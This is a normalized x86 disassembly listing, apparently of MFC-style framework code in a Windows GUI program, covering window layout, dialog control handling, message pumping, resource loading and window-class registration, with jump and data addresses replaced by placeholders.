call [ GetClientRect@IAT ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
push 0x8
call [ BeginDeferWindowPos@IAT ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp [ ebp + 0x14 ] 0x1
je r-xdata
cmp [ ebp + 0x14 ] 0x1
jne r-xdata
push esi
call [ GetDlgCtrlID@IAT ]
push esi
movzx edi ax
call sub_43e7da
cmp edi [ ebp + 0x10 ]
jne r-xdata
push [ ebx + 0x1c ]
call [ GetTopWindow@IAT ]
mov esi eax
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ ebp + 0x20 ] ebx
je r-xdata
cmp edi [ ebp + 0x8 ]
jb r-xdata
mov [ ebp - 0x4 ] esi
jmp r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp - 0xc ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0xc ] ecx
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
push [ ebp + 0x18 ]
call [ CopyRect@IAT ]
jmp r-xdata
push 0x2
push esi
call [ GetWindow@IAT ]
mov esi eax
jmp r-xdata
cmp edi [ ebp + 0xc ]
ja r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x1c
push [ ebp - 0x24 ]
call [ EndDeferWindowPos@IAT ]
push [ ebp - 0x4 ]
call sub_43e7b3
cmp [ ebp + 0x14 ] 0x2
jne r-xdata
cmp esi ebx
je r-xdata
cmp eax ebx
je r-xdata
mov edx [ eax ]
lea ecx [ ebp - 0x20 ]
push ebx
push ecx
mov ecx eax
call [ edx + 0x60 ]
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x24 ]
push [ ebp - 0x4 ]
push eax
call sub_440388
mov edx [ ebp + 0x18 ]
mov ecx [ edx ]
add [ ebp - 0x20 ] ecx
mov ecx [ edx + 0x4 ]
add [ ebp - 0x1c ] ecx
mov ecx [ edx + 0x8 ]
sub [ ebp - 0x18 ] ecx
mov ecx [ edx + 0xc ]
sub [ ebp - 0x14 ] ecx
lea eax [ ebp - 0x24 ]
push eax
push ebx
push 0x361
push esi
call [ SendMessageA@IAT ]
sub_440388
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
push ebx
call [ GetParent@IAT ]
mov edi [ ebp + 0x8 ]
mov [ ebp + 0xc ] eax
test edi edi
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push ebx
call [ GetWindowRect@IAT ]
mov esi [ ScreenToClient@IAT ]
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0xc ]
call esi
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
call esi
mov esi [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push esi
push eax
call [ EqualRect@IAT ]
test eax eax
jne r-xdata
cmp [ edi ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
mov edx [ esi + 0xc ]
push 0x14
test edi edi
je r-xdata
sub edx eax
push edx
mov edx [ esi + 0x8 ]
sub edx ecx
push edx
push eax
push ecx
push 0x0
push ebx
call [ SetWindowPos@IAT ]
sub edx eax
push edx
mov edx [ esi + 0x8 ]
sub edx ecx
push edx
push eax
push ecx
push 0x0
push ebx
push [ edi ]
call [ DeferWindowPos@IAT ]
mov [ edi ] eax
jmp r-xdata
sub_440422
push esi
mov esi ecx
call sub_441659
cmp [ esp + 0xc ] 0x0
jne r-xdata
push eax
push 0x0
mov ecx esi
call sub_44163f
push eax
push [ esp + 0x14 ]
call [ AdjustWindowRectEx@IAT ]
pop esi
retn 0x8
and ah 0xfd
sub_44044d
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi ecx
call sub_43fd7e
mov ecx [ ebp + 0x8 ]
mov esi eax
and ecx 0xfff0
mov eax ecx
sub eax 0xf040
je r-xdata
cmp [ ebp + 0xc ] 0x75
jne r-xdata
sub eax 0x10
je r-xdata
xor eax eax
test esi esi
je r-xdata
sub eax 0x10
je r-xdata
mov ecx esi
call sub_441868
jmp r-xdata
cmp ecx 0xf060
je r-xdata
sub eax 0xa0
jne r-xdata
push 0x1
pop eax
jmp r-xdata
test esi esi
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
pop edi
pop esi
leave
retn 0x8
push ebx
mov ebx [ edi + 0x1c ]
call [ GetFocus@IAT ]
push [ esi + 0x1c ]
mov edi [ SetActiveWindow@IAT ]
mov [ ebp - 0x4 ] eax
call edi
push eax
call sub_43e7b3
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x112
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
mov esi [ IsWindow@IAT ]
push ebx
call esi
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call esi
test eax eax
pop ebx
je r-xdata
push ebx
call edi
push [ ebp - 0x4 ]
call [ SetFocus@IAT ]
sub_44050f
push esi
push edi
mov edi [ esp + 0x10 ]
mov esi [ edi ]
xor eax eax
push esi
call sub_43e7da
test eax eax
je r-xdata
cmp esi [ esp + 0xc ]
je r-xdata
mov edx [ eax ]
push edi
mov ecx eax
call [ edx + 0x90 ]
test eax eax
jne r-xdata
push esi
call [ GetParent@IAT ]
mov esi eax
jmp r-xdata
push 0x1
pop eax
jmp r-xdata
test esi esi
je r-xdata
pop edi
pop esi
retn 0x8
sub_440551
push esi
mov esi ecx
push sub_452fff
mov ecx rw-data
call sub_45518e
push [ esp + 0x8 ]
mov edx [ esi ]
mov ecx esi
push [ eax + 0x40 ]
push [ eax + 0x3c ]
push [ eax + 0x38 ]
call [ edx + 0xa8 ]
pop esi
retn 0x4
sub_44057e
mov eax sub_4630f0
call sub_42dc88
sub esp 0x3c
push esi
push edi
push 0x0
call sub_43e741
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov edi [ ebp + 0x8 ]
lea esi [ eax + 0x4 ]
push edi
mov ecx esi
call sub_43d531
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
push [ ebp + 0xc ]
mov ecx eax
call sub_440551
push edi
call [ GetParent@IAT ]
push eax
mov ecx esi
call sub_43d531
test eax eax
je r-xdata
mov eax [ eax + 0x34 ]
test eax eax
je r-xdata
push edi
lea ecx [ eax + 0x20 ]
call sub_43d531
mov esi eax
test esi esi
je r-xdata
push edi
lea ecx [ ebp - 0x48 ]
call sub_43e3c6
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x10 ] esi
call sub_440551
and [ ebp - 0x2c ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x48 ]
mov esi eax
call sub_43ee41
mov eax esi
jmp r-xdata
sub_440622
push ebp
mov ebp esp
cmp [ ecx + 0x38 ] 0x0
push esi
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44067d
push [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
lea eax [ esi + 0x2000 ]
push eax
push [ ecx + 0x1c ]
call [ SendMessageA@IAT ]
cmp esi 0x132
jb r-xdata
mov ecx [ ebp + 0x14 ]
test ecx ecx
je r-xdata
cmp esi 0x138
ja r-xdata
push 0x1
pop eax
jmp r-xdata
mov [ ecx ] eax
test eax eax
je r-xdata
pop esi
pop ebp
retn 0x10
sub_44067d
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov edx 0x111
cmp eax edx
push esi
ja r-xdata
cmp eax 0x114
jb r-xdata
je r-xdata
cmp eax 0x132
jb r-xdata
cmp eax 0x115
jbe r-xdata
mov eax [ ebp + 0xc ]
xor esi esi
shr eax 0x10
push esi
or eax 0xbd110000
push esi
push eax
push esi
call sub_441aa8
test eax eax
je r-xdata
cmp eax 0x2b
jb r-xdata
xor eax eax
cmp eax 0x138
ja r-xdata
push [ ebp + 0x14 ]
add eax 0xbc00
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_43f659
jmp r-xdata
cmp eax 0x210
jne r-xdata
mov ecx [ ebp + 0x14 ]
push 0x1
cmp ecx esi
pop eax
je r-xdata
cmp eax 0x2f
jbe r-xdata
mov edx [ ebp + 0xc ]
add eax 0xfffffece
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push edi
xor esi esi
push eax
push esi
push 0xbc19
mov [ ebp - 0x8 ] edx
call sub_43f659
cmp [ edi ] esi
pop edi
jne r-xdata
pop esi
leave
retn 0x10
mov [ ecx ] eax
jmp r-xdata
cmp eax 0x39
je r-xdata
cmp eax 0x4e
jne r-xdata
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] eax
mov edx [ eax + 0x8 ]
xor esi esi
lea eax [ ebp - 0x8 ]
push esi
push eax
movzx eax dx
or eax 0xbc4e0000
push eax
push esi
call sub_441aa8
jmp r-xdata
sub_440765
cmp [ esp + 0x4 ] 0x1
push esi
mov esi ecx
je r-xdata
push 0x0
push [ esp + 0x10 ]
call sub_44057e
test eax eax
jne r-xdata
cmp [ esp + 0x8 ] 0x2
jne r-xdata
pop esi
retn 0x8
mov ecx esi
call sub_43e71a
sub_4407b4
push esi
mov esi ecx
call sub_45357b
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
call sub_45357b
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x1c ] esi
jne r-xdata
mov ecx esi
call sub_44163f
test eax 0x40000000
jne r-xdata
call sub_4428ff
test eax eax
je r-xdata
mov ecx rw-data
call sub_443645
mov ecx esi
call sub_43e71a
pop esi
retn
push 0x1
push 0x1
push 0x0
push 0x0
push 0x15
push [ esi + 0x1c ]
call sub_43ff47
call sub_4428ff
cmp [ eax + 0x1c ] esi
jne r-xdata
push sub_453064
mov ecx rw-data
call sub_455223
mov eax [ eax + 0x1c ]
test eax eax
je r-xdata
call eax
sub_440831
push esi
push edi
mov edi ecx
call sub_45357b
cmp [ eax + 0x14 ] 0x0
jne r-xdata
and [ rw-data ] 0x0
push 0x0
push 0x0
mov ecx edi
call sub_440933
pop edi
pop esi
retn 0x8
push sub_453064
mov ecx rw-data
call sub_455223
mov esi eax
call sub_4428ff
test eax eax
je r-xdata
call sub_4428ff
cmp [ eax + 0x1c ] edi
jne r-xdata
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
call eax
sub_440884
push esi
mov esi ecx
call sub_45357b
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov ecx esi
call sub_44163f
test eax 0x40000000
jne r-xdata
cmp [ eax + 0x1c ] esi
jne r-xdata
pop esi
retn 0x4
call sub_43e6e5
push 0x1
push 0x1
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ esi + 0x1c ]
call sub_43ff47
push [ esp + 0x8 ]
mov ecx eax
call sub_442852
sub_4408cf
push ebx
push esi
push edi
mov ebx ecx
call sub_44163f
test eax 0x40000000
jne r-xdata
mov ecx ebx
call sub_43e71a
call sub_420710
mov esi eax
test esi esi
je r-xdata
mov edi [ GetKeyState@IAT ]
push 0x10
call edi
test ax ax
jl r-xdata
push 0x11
call edi
test ax ax
jl r-xdata
push 0x12
call edi
test ax ax
jl r-xdata
push 0x0
push 0xe146
push 0x111
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn 0x4
sub_440933
push esi
mov esi ecx
call sub_420710
cmp eax esi
jne r-xdata
mov ecx esi
call sub_44163f
test eax 0x40000000
jne r-xdata
mov ecx rw-data
call sub_443689
mov ecx esi
call sub_43e71a
pop esi
retn 0x8
call sub_43e6e5
push 0x1
push 0x1
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ esi + 0x1c ]
call sub_43ff47
sub_44097c
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push esi
push eax
mov eax [ ebp + 0xc ]
mov esi ecx
push [ eax + 0x4 ]
call sub_44057e
test eax eax
je r-xdata
mov ecx esi
call sub_43e71a
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0x8
sub_4409a6
push esi
mov esi ecx
mov ecx [ esp + 0x10 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_43e71a
push 0x0
call sub_440551
test eax eax
jne r-xdata
pop esi
retn 0xc
sub_4409c7
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
mov edi [ PeekMessageA@IAT ]
mov esi 0x121
push 0x1
push esi
push esi
lea eax [ ebp - 0x1c ]
push 0x0
mov ebx ecx
push eax
mov ecx ebx
call sub_43e71a
pop edi
pop esi
pop ebx
leave
retn 0x8
lea eax [ ebp - 0x1c ]
push eax
call [ DispatchMessageA@IAT ]
push 0x1
push esi
push esi
lea eax [ ebp - 0x1c ]
push 0x0
push eax
jmp r-xdata
call edi
test eax eax
je r-xdata
sub_440a11
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
push eax
call sub_440551
test eax eax
je r-xdata
mov ecx esi
call sub_43e71a
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_440a38
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx ecx
lea eax [ ebp + 0xc ]
push eax
mov ecx edi
call sub_440551
test eax eax
je r-xdata
push sub_453033
mov ecx rw-data
call sub_455223
test edi edi
mov esi eax
je r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
push [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
push [ esi + 0x4 ]
push [ ebp + 0x10 ]
push edi
push [ eax + 0x4 ]
call sub_440a9b
test eax eax
jne r-xdata
mov edi [ edi + 0x1c ]
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x4 ]
mov ecx ebx
call sub_43e71a
jmp r-xdata
sub_440a9b
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x1
je r-xdata
test eax eax
je r-xdata
cmp eax 0x5
je r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0xc
push [ ebp + 0x14 ]
call [ GetObjectA@IAT ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call [ SetBkColor@IAT ]
mov eax [ ebp + 0x18 ]
cmp eax 0xffffffff
jne r-xdata
push eax
push [ ebp + 0xc ]
call sub_4478a9
test eax eax
je r-xdata
push eax
push [ ebp + 0x8 ]
call [ SetTextColor@IAT ]
push 0x1
pop eax
jmp r-xdata
push 0x8
call [ GetSysColor@IAT ]
leave
retn 0x14
sub_440b18
mov eax sub_4630fc
call sub_42dc88
sub esp 0x24
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x10 ] esp
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x2c ]
push esi
call sub_440bba
call sub_453349
mov edi eax
and [ ebp + 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] edi
mov ecx [ edi + 0xb8 ]
lea eax [ edi + 0xb8 ]
mov [ ebp - 0x18 ] ecx
mov ecx [ esi + 0x1c ]
mov [ eax ] ecx
mov eax [ esi ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx esi
call [ eax + 0x84 ]
mov [ ebp + 0x8 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0xc ]
mov [ edi + 0xb8 ] eax
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_440bd0
push ebp
mov ebp esp
sub esp 0x60
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x8 ] esi
call sub_44163f
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test [ ebp - 0x1 ] 0x40
je r-xdata
mov edi [ eax + 0x1c ]
jmp r-xdata
push 0x4
push [ esi + 0x1c ]
call [ GetWindow@IAT ]
push [ esi + 0x1c ]
call [ GetParent@IAT ]
jmp r-xdata
mov ebx [ GetWindowRect@IAT ]
lea eax [ ebp - 0x28 ]
push eax
push [ esi + 0x1c ]
call ebx
test [ ebp - 0x1 ] 0x40
jne r-xdata
push 0x0
push 0x0
push 0x36b
push edi
call [ SendMessageA@IAT ]
test eax eax
je r-xdata
mov edi eax
test edi edi
je r-xdata
push [ esi + 0x1c ]
call [ GetParent@IAT ]
mov esi [ GetClientRect@IAT ]
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
push ebx
call esi
lea eax [ ebp - 0x38 ]
push eax
push edi
call esi
lea eax [ ebp - 0x38 ]
push 0x2
push eax
push ebx
push edi
call [ MapWindowPoints@IAT ]
test edi edi
je r-xdata
mov edi eax
mov eax [ ebp - 0x10 ]
add edi ecx
cmp edi eax
jle r-xdata
mov ecx [ ebp - 0x18 ]
jmp r-xdata
test edi edi
mov [ ebp - 0x60 ] 0x28
jne r-xdata
push 0xfffffff0
push edi
call [ GetWindowLongA@IAT ]
test eax 0x10000000
je r-xdata
cmp esi [ ebp - 0x14 ]
jge r-xdata
sub eax [ ebp - 0x20 ]
add eax [ ebp - 0x28 ]
mov ecx eax
lea eax [ ebp - 0x38 ]
push eax
push edi
call ebx
lea eax [ ebp - 0x60 ]
push eax
push 0x2
push edi
call sub_420862
push eax
call sub_4208cd
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ CopyRect@IAT ]
jmp r-xdata
call sub_420710
test eax eax
je r-xdata
xor edi edi
test eax 0x20000000
je r-xdata
add ebx esi
cmp ebx [ ebp - 0xc ]
jle r-xdata
mov esi [ ebp - 0x14 ]
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov ecx [ ebp - 0x30 ]
mov edi [ ebp - 0x20 ]
add eax ecx
sub edi [ ebp - 0x28 ]
mov ebx [ ebp - 0x1c ]
cdq
sub eax edx
sub ebx [ ebp - 0x24 ]
mov ecx eax
mov eax edi
cdq
sub eax edx
mov edx [ ebp - 0x2c ]
sar ecx 0x1
sar eax 0x1
sub ecx eax
mov eax [ ebp - 0x34 ]
add eax edx
cdq
sub eax edx
mov esi eax
mov eax ebx
cdq
sub eax edx
sar esi 0x1
sar eax 0x1
sub esi eax
cmp ecx [ ebp - 0x18 ]
jge r-xdata
lea ecx [ ebp - 0x60 ]
push ecx
push 0x1
push eax
call sub_420862
push eax
call sub_4208cd
mov esi [ CopyRect@IAT ]
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call esi
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call esi
jmp r-xdata
mov eax [ eax + 0x1c ]
push 0x15
push 0xffffffff
push 0xffffffff
push esi
push ecx
mov ecx [ ebp - 0x8 ]
push 0x0
call sub_4417b0
pop edi
pop esi
pop ebx
leave
retn 0x4
mov esi [ ebp - 0x24 ]
sub esi [ ebp - 0x1c ]
add esi [ ebp - 0xc ]
sub_440d85
push ebx
push esi
push edi
xor edi edi
cmp [ esp + 0x10 ] edi
mov ebx ecx
je r-xdata
push edi
mov ecx ebx
call sub_440dd5
call sub_45357b
mov esi [ eax + 0xc ]
push 0xf0
push [ esp + 0x14 ]
push esi
call [ FindResourceA@IAT ]
cmp eax edi
je r-xdata
push eax
push esi
call [ LoadResource@IAT ]
cmp eax edi
jne r-xdata
push eax
call [ LockResource@IAT ]
mov edi eax
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn 0x4
sub_440dd5
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx ecx
test esi esi
mov [ ebp - 0x4 ] 0x1
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push 0x364
push [ ebx + 0x1c ]
call sub_43ff47
push edi
mov edi [ SendDlgItemMessageA@IAT ]
cmp [ ebp - 0x4 ] 0x0
pop edi
je r-xdata
inc esi
inc esi
mov ax [ esi ]
inc esi
inc esi
mov edx [ esi ]
add esi 0x4
cmp ax 0x1234
mov [ ebp + 0x8 ] edx
je r-xdata
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
leave
retn 0x4
or [ ebp - 0x24 ] 0xffffffff
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x20 ] esi
push 0x401
jmp r-xdata
cmp ax 0x401
jne r-xdata
movzx eax cx
push eax
push [ ebx + 0x1c ]
call edi
cmp eax 0xffffffff
jne r-xdata
cmp ax 0x403
jne r-xdata
mov eax 0x180
jmp r-xdata
add esi [ ebp + 0x8 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp ax 0x401
jne r-xdata
mov eax 0x143
movzx eax ax
push esi
push 0x0
push eax
mov cx [ esi ]
test cx cx
je r-xdata
cmp ax 0x180
je r-xdata
cmp ax 0x143
jne r-xdata
sub_440ea7
mov eax sub_463110
call sub_42dc88
sub esp 0x68
push esi
mov esi ecx
push edi
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x10 ] esi
call sub_441c49
lea ecx [ ebp - 0x74 ]
call sub_43e388
push [ esi + 0x1c ]
xor edi edi
mov [ ebp - 0x4 ] edi
call [ GetTopWindow@IAT ]
mov esi eax
cmp esi edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x74 ]
mov [ ebp - 0x58 ] edi
call sub_43ee41
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
push ebx
mov ecx [ ebp - 0x10 ]
lea eax [ ebp - 0x38 ]
push edi
push eax
push 0xffffffff
push [ ebp - 0x34 ]
call sub_441aa8
test eax eax
jne r-xdata
lea ecx [ ebp - 0x38 ]
push edi
push ecx
push 0xbd11ffff
push edi
mov ecx eax
call sub_441aa8
test eax eax
jne r-xdata
push 0x2
push esi
call [ GetWindow@IAT ]
mov esi eax
cmp esi edi
jne r-xdata
mov ebx [ ebp + 0xc ]
cmp ebx edi
je r-xdata
push esi
mov [ ebp - 0x58 ] esi
call [ GetDlgCtrlID@IAT ]
movzx eax ax
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x74 ]
push esi
mov [ ebp - 0x24 ] eax
call sub_43e7da
cmp eax edi
je r-xdata
pop ebx
push ebx
lea ecx [ ebp - 0x38 ]
push [ ebp + 0x8 ]
call sub_441e0e
push edi
push edi
push 0x87
push [ ebp - 0x58 ]
call [ SendMessageA@IAT ]
test ah 0x20
je r-xdata
xor ebx ebx
lea ecx [ ebp - 0x74 ]
call sub_44163f
and eax 0xf
cmp eax 0x3
je r-xdata
cmp eax 0x6
je r-xdata
cmp eax 0x7
je r-xdata
cmp eax 0x9
jne r-xdata
sub_440fac
mov edx [ esp + 0x4 ]
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
cmp eax 0x200
jb r-xdata
cmp eax 0x108
jbe r-xdata
xor eax eax
cmp eax 0x209
ja r-xdata
push edx
call sub_44160c
jmp r-xdata
retn 0x4
sub_440fdc
sub esp 0x10
push ebx
push ebp
push esi
push edi
push 0x1
xor edi edi
test [ esp + 0x28 ] 0x4
pop ebx
mov esi ecx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x14 ] edi
je r-xdata
mov [ esp + 0x10 ] edi
call sub_44163f
test eax 0x10000000
mov [ esp + 0x10 ] ebx
je r-xdata
call sub_4428ff
mov edx [ eax ]
mov ecx eax
call [ edx + 0x5c ]
test eax eax
je r-xdata
push edi
push edi
push edi
push edi
push ebp
call [ PeekMessageA@IAT ]
test eax eax
jne r-xdata
push [ esi + 0x1c ]
call [ GetParent@IAT ]
or [ esi + 0x24 ] 0x18
mov [ esp + 0x1c ] eax
call sub_4428ff
mov ebx [ UpdateWindow@IAT ]
mov ebp eax
add ebp 0x30
push edi
call sub_45b297
or eax 0xffffffff
jmp r-xdata
cmp [ esp + 0x10 ] edi
je r-xdata
cmp [ esp + 0x10 ] edi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn 0x4
mov eax [ esi ]
mov ecx esi
call [ eax + 0x70 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x4 ]
cmp eax 0x118
je r-xdata
test [ esp + 0x24 ] 0x1
jne r-xdata
push 0x1
mov ecx esi
call sub_4417ff
push [ esi + 0x1c ]
call ebx
mov [ esp + 0x10 ] edi
and [ esi + 0x24 ] 0xffffffe7
mov eax [ esi + 0x2c ]
call sub_4428ff
mov edx [ eax ]
push ebp
mov ecx eax
call [ edx + 0x64 ]
test eax eax
je r-xdata
push 0x1
mov ecx esi
call sub_4417ff
push [ esi + 0x1c ]
call ebx
mov [ esp + 0x10 ] edi
cmp eax 0x104
jne r-xdata
test [ esp + 0x24 ] 0x2
jne r-xdata
cmp [ esp + 0x1c ] edi
je r-xdata
push edi
push edi
push edi
push edi
push ebp
call [ PeekMessageA@IAT ]
test eax eax
jne r-xdata
mov [ esp + 0x18 ] 0x1
mov [ esp + 0x14 ] edi
mov [ esp + 0x18 ] edi
jmp r-xdata
mov eax [ esp + 0x14 ]
inc [ esp + 0x14 ]
push eax
push edi
push 0x36a
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
test eax eax
jne r-xdata
cmp [ esp + 0x14 ] edi
jne r-xdata
jmp r-xdata
cmp [ esp + 0x18 ] edi
je r-xdata
push [ esi + 0x1c ]
push edi
push 0x121
push [ esp + 0x28 ]
call [ SendMessageA@IAT ]
sub_441142
mov eax [ esp + 0x4 ]
mov [ ecx + 0x2c ] eax
mov eax [ ecx + 0x24 ]
test al 0x10
je r-xdata
retn 0x4
and al 0xef
mov [ ecx + 0x24 ] eax
xor eax eax
push eax
push eax
push eax
push [ ecx + 0x1c ]
call [ PostMessageA@IAT ]
sub_441166
mov eax [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
push edi
mov [ esi + 0x24 ] eax
call sub_45357b
movzx ecx [ esp + 0x14 ]
mov eax [ eax + 0xc ]
mov edi [ LoadIconA@IAT ]
push ecx
push eax
call edi
test eax eax
mov [ esi + 0x14 ] eax
jne r-xdata
push esi
call sub_43f352
pop edi
pop esi
retn 0xc
push 0x7f00
push eax
call edi
mov [ esi + 0x14 ] eax
sub_4411a7
push ebx
push esi
mov esi r--data
push edi
push esi
call [ GetModuleHandleA@IAT ]
push esi
mov edi eax
call [ LoadLibraryA@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn 0x8
push r--data
push ebx
xor esi esi
call [ GetProcAddress@IAT ]
test eax eax
jne r-xdata
push [ esp + 0x10 ]
call eax
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
mov edi 0x3fc0
and eax edi
cmp eax [ esp + 0x14 ]
jne r-xdata
push ebx
call [ FreeLibrary@IAT ]
mov eax esi
mov esi [ esp + 0x14 ]
test edi edi
jne r-xdata
call [ InitCommonControls@IAT ]
mov esi edi
jmp r-xdata
call [ InitCommonControls@IAT ]
or si 0x3fc0
sub_44121e
push ebp
mov ebp esp
sub esp 0x34
call sub_45357b
mov [ ebp - 0x4 ] eax
mov eax [ eax + 0x18 ]
not eax
and [ ebp + 0x8 ] eax
jne r-xdata
push ebx
push esi
push edi
xor edi edi
push 0x28
lea eax [ ebp - 0x34 ]
push edi
push eax
xor esi esi
call sub_42dc30
mov eax [ DefWindowProcA@IAT ]
add esp 0xc
mov [ ebp - 0x30 ] eax
call sub_45357b
mov eax [ eax + 0x8 ]
push 0x8
test [ ebp + 0x8 ] 0x1
mov [ ebp - 0x24 ] eax
mov eax [ rw-data ]
pop ebx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0xc ] ebx
je r-xdata
push 0x1
pop eax
jmp r-xdata
test [ ebp + 0x8 ] 0x20
je r-xdata
lea eax [ ebp - 0x34 ]
mov [ ebp - 0x34 ] 0xb
push eax
mov [ ebp - 0x10 ] r--data
call sub_43f352
test eax eax
je r-xdata
leave
retn 0x4
test [ ebp + 0x8 ] 0x2
je r-xdata
or [ ebp - 0x34 ] 0x8b
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_43f352
test eax eax
je r-xdata
push 0x1
pop esi
test [ ebp + 0x8 ] 0x4
je r-xdata
lea eax [ ebp - 0x34 ]
mov [ ebp - 0x34 ] edi
push eax
mov [ ebp - 0x10 ] r--data
mov [ ebp - 0x18 ] 0x10
call sub_43f352
test eax eax
je r-xdata
or esi 0x20
test [ ebp + 0x8 ] bl
je r-xdata
push 0x7a01
lea eax [ ebp - 0x34 ]
push r--data
push eax
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x18 ] edi
call sub_441166
test eax eax
je r-xdata
or esi 0x2
test [ ebp + 0x8 ] 0x10
je r-xdata
push 0x7a02
lea eax [ ebp - 0x34 ]
